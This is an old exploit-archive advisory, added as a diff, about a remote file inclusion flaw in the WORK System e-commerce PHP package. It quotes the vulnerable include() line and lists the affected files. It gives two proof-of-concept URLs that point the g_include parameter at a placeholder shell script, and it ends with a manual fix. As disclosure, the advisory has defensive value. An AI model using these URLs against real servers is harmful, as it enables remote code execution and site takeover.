@@ -1,0 +1,46 @@
+============================================================================================
+
+WORK System E-Commerce (g_include) Remote File Inclusion Vulnerability
+
+============================================================================================
+
+Product............: WORK system e-commerce
+Affected versions..: worksystem <= 3.0.1
+Security Risk......: High
+Vendor.............: Laurent Van den Reysen (http://worksystem.sourceforge.net/)
+Product Link.......: http://prdownloads.sourceforge.net/worksystem/worksystem_3_0_1.zip?download
+Discovered by......: SlimTim10
+
+
+Details:
+---------
+Many files (including index.php) use the include() function with a variable that can be
+altered remotely.
+
+Vulnerable Code:
+-----------------
+include ($g_include."<file>.inc");
+
+Vulnerable Files:
+------------------
+'index.php' (main directory) along with many files in the './administration/module' and
+'./module' directories.
+
+Proof of Concept:
+------------------
+http://[host]/work/index.php?g_include=[shell_script]
+http://[host]/work/module/forum/forum.php?g_include=[shell_script]
+
+Solution:
+----------
+No patch has been provided. The vulnerable files can be manually edited to initialize the
+$g_include variable.
+
+============================================================================================
+
+Shoutz: Anonymous bro, Magnetosphere, dw0rek, c4p_sl0ck, str0ke!
+SlimTim10 <slimtim10[at]gmail[dot]com>
+
+============================================================================================
+
+# milw0rm.com [2006-11-10]
